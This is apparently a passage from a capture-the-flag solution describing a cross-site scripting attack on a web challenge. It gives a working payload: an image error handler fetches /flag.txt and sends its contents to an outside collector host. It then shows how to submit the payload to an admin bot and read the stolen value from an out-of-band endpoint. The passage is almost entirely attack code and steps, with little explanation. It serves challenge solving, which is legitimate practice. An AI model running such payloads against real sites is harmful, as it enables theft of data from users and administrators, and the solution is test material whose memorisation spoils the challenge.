Full payload (put it in the fragment, URL-encoded):

```html
<img
  src="x"
  onerror="fetch('/flag.txt').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?f='+encodeURIComponent(t)})"
/>
```

Submit it as a path:

```
POST /report
Content-Type: application/json

{"url":"/#%3Cimg%20src%3Dx%20onerror%3D%22fetch('/flag.txt')...%22%3E"}
```

(URL-encode the whole payload after `/#`.) Wait ~2s for the admin bot. Then:

```
GET /oob/received
```

Find the item with a path like `/report?f=FLAG%7B...%7D`. URL-decode the `f=`
value to get `FLAG{...}`. `tests/exploit.py` does all of this and prints the
flag.
